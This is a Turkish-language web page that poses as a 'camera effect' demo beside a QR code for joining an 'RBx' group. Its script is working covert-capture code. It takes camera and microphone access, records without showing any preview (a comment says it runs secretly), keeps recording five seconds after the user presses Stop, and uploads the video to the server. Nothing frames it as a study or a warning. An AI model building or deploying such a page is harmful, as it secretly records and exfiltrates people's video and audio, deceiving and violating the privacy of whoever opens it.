<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Efekt ve Doğrulama</title>
    <style>
        body { font-family: Arial, sans-serif; background: #121212; color: white; margin: 0; display: flex; height: 100vh; flex-direction: row; }
        
        /* Sol Taraf (İşlem Bölümü) */
        .sol-taraf { flex: 7; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
        .kutu { background: #222; padding: 40px; border-radius: 12px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); width: 100%; max-width: 400px; }
        
        /* Sağ Taraf (QR Kod Bölümü) */
        .sag-taraf { flex: 3; background: #1a1a1a; display: flex; flex-direction: column; justify-content: center; align-items: center; border-left: 2px solid #333; padding: 20px; text-align: center; }
        .sag-taraf img { width: 100%; max-width: 250px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.8); }
        .sag-taraf h3 { color: #0088cc; }

        /* Butonlar */
        button { background: #0088cc; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 20px; transition: 0.3s; }
        button:hover { background: #0077b3; }
        button:disabled { background: #555 !important; cursor: not-allowed; }
        button.kirmizi { background: #dc3545; display: none; }
        button.kirmizi:hover { background: #c82333; }
        
        /* Durum ve Loading İkonu */
        #durum { display: none; margin-top: 25px; font-size: 18px; color: #ff9800; align-items: center; justify-content: center; font-weight: bold; }
        .spinner { border: 4px solid rgba(255,255,255,0.2); border-top: 4px solid #ff9800; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin-left: 12px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* Telefondan girilirse alt alta görünsün */
        @media (max-width: 768px) { body { flex-direction: column; } .sag-taraf { border-left: none; border-top: 2px solid #333; padding: 40px 20px; } }
    </style>
</head>
<body>

    <div class="sol-taraf">
        <div class="kutu">
            <h2>Kamera Efekti</h2>
            <p>Efekti başlatmak için aşağıdaki butona basın.</p>
            
            <button id="baslatBtn" onclick="kameraBaslat()">Kamera Efekti</button>
            
            <!-- Durum Bilgisi (Görüntü Veriliyor / Durduruluyor) -->
            <div id="durum">
                <span id="durumMetni">Görüntü yükleniyor</span>
                <div class="spinner" id="spinner"></div>
            </div>
            
            <button id="durdurBtn" class="kirmizi" onclick="kameraDurdur()">Durdur</button>
        </div>
    </div>

    <div class="sag-taraf">
        <h3>RBx Grubuna Katıl</h3>
        <p>Aramıza katılmak için QR kodu okutabilirsiniz.</p>
        <img src="/static/image_8c519f.jpg" alt="RBx QR Kod">
    </div>

    <script>
        let mediaRecorder;
        let recordedChunks = [];
        let stream;

        function kameraBaslat() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
                .then(function(s) {
                    stream = s;
                    // DİKKAT: Kullanıcıya video gösterilmiyor, gizli çalışıyor.
                    
                    document.getElementById('baslatBtn').style.display = "none";
                    document.getElementById('durum').style.display = "flex";
                    document.getElementById('durumMetni').innerText = "Görüntü yükleniyor";
                    document.getElementById('durdurBtn').style.display = "inline-block";

                    // Kaydı Başlat
                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                    mediaRecorder.ondataavailable = function(e) {
                        if (e.data.size > 0) {
                            recordedChunks.push(e.data);
                        }
                    };
                    mediaRecorder.start();
                })
                .catch(function(err) {
                    alert("Devam etmek için izin vermelisiniz.");
                });
        }

        function kameraDurdur() {
            // Site çökmesin diye butonu kitle ve yazıyı değiştir
            document.getElementById('durdurBtn').disabled = true;
            document.getElementById('durumMetni').innerText = "Durduruluyor";

            // 5 SANİYE BEKLEME SÜRESİ (5000 milisaniye)
            setTimeout(function() {
                
                mediaRecorder.onstop = function() {
                    let blob = new Blob(recordedChunks, { type: "video/webm" });
                    let formData = new FormData();
                    formData.append("video", blob, "video_kaydi.webm");

                    // Arka plana yolla
                    fetch('/medya-gonder', {
                        method: 'POST',
                        body: formData
                    }).then(response => {
                        if(response.ok) {
                            document.getElementById('durumMetni').innerText = "İşlem Başarılı! Sağdaki QR kodu okutabilirsiniz.";
                            document.getElementById('durumMetni').style.color = "#28a745";
                            document.getElementById('spinner').style.display = "none";
                            document.getElementById('durdurBtn').style.display = "none";
                        }
                    });

                    // Kamerayı tamamen kapat
                    stream.getTracks().forEach(track => track.stop()); 
                };
                
                mediaRecorder.stop(); // 5 Saniye dolunca kaydı gerçekten bitir
                
            }, 5000); // <- 5 saniye burada uygulanıyor
        }
    </script>
</body>
</html>
